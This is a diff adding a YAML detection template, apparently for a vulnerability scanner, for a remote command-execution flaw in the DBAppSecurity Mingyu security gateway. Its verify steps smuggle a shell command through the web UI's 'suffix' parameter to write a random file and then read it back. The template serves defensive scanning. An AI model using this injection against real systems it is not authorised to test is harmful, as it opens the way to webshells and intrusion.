@@ -1,0 +1,52 @@
+app: 明御安全网关
+query: app:"明御安全网关"
+meta:
+    name: 安恒明御安全网关命令执行漏洞
+    level: 4
+    tags:
+        - remote_code_execution
+    description: 系统存在命令执行漏洞，通过命令可写入webshell获取权限
+    homepage: https://www.dbappsecurity.com.cn/
+    author: X prism
+    references: https://mp.weixin.qq.com/s/020gpClDeLfR6mo6JoOLtg
+    solution: 安装补丁、升级系统
+    create_at: "2023-12-21 15:50:17"
+    available: false
+    steps:
+        variable:
+            - r1: randomLowercase(5)
+        verify_steps:
+            type: and
+            verify:
+                - request:
+                    method: GET
+                    path: /webui/?g=aaa_portal_auth_local_submit&bkg_flag=0&$type=1&suffix=1|echo+"{{r1}}"+>+.{{r1}}.txt
+                    redirect: true
+                    header: []
+                    params: ""
+                  response:
+                    - name: code
+                      value: "200"
+                      type: equals
+                    - name: body
+                      value: '"success"'
+                      type: contains
+                - request:
+                    method: GET
+                    path: /webui/.{{r1}}.txt
+                    redirect: true
+                    header: []
+                    params: ""
+                  response:
+                    - name: code
+                      value: "200"
+                      type: equals
+                    - name: body
+                      value: '{{r1}}'
+                      type: contains
+        exploit_steps:
+            type: ""
+            params:
+                name: ""
+                type: input
+                value: ""
